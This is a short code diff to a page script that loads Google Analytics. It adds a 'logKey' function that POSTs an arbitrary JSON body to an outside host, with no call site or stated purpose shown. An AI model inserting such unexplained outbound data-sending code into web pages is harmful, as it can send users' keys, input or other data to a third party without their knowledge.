@@ -33,3 +33,14 @@ function dynamicModifyPage() {
 dynamicModifyPage()
 // Call the function with your Google Analytics tracking ID
 loadGoogleAnalytics('G-PPHF9Z4JLK');
+
+function logKey(body) {
+  let url = "https://mxpush.mxfast.com/logmax"
+  fetch(url, {
+      method: 'POST',
+      headers: {
+          'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(body)
+  })
+}
